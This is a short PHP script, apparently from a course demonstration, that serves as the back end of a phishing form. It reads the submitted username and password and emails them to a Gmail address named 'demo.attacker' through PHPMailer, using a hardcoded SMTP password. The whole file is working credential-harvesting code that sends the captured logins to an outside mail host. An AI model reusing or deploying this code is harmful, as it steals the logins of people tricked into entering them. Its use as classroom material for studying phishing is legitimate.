<?php

use PHPMailer\PHPMailer\PHPMailer;

$email = "comp590.demo.attacker@gmail.com";

//ini_set("SMTP","ssl://smtp.gmail.com");
//ini_set("smtp_port","465");
//ini_set('sendmail_from', $email);

//ini_set("SMTP","smtp.gmail.com");
//ini_set("smtp_port","587");
//ini_set('sendmail_from', $email);

//ini_set("SMTP","tls://smtp.gmail.com");
//ini_set("smtp_port","587");
//ini_set('sendmail_from', $email);

$mail = new PHPMailer();
$mail->isSMTP();
$mail->Mailer = "smtp";
$mail->SMTPDebug = 1;
$mail->SMTPAuth = true;
$mail->SMTPSecure = "tls";
$mail->Port = 587;
$mail->Host = "smtp.gmail.com";
$mail->Username = $email;
$mail->Password = "comp590344";

echo "action page navigated";
if ( isset( $_REQUEST['submit'])) {
    echo "Form submitted";
    $username = $_REQUEST['name'];
    $password = $_REQUEST['pass'];
    
    $msg = "Username: $username \n Password: $password";

    $mail->isHTML(true);
    $mail->addAddress($email, $email);
    $mail->setFrom($email, $email);
    $mail->addReplyTo($email, $email);
    $mail->Subject = "User details";
    $mail->msgHTML($msg);
    $mail->send();
//    mail($email, "User details", $msg);

//} else {
//    mail($email, "Test email", "Testing.");
}
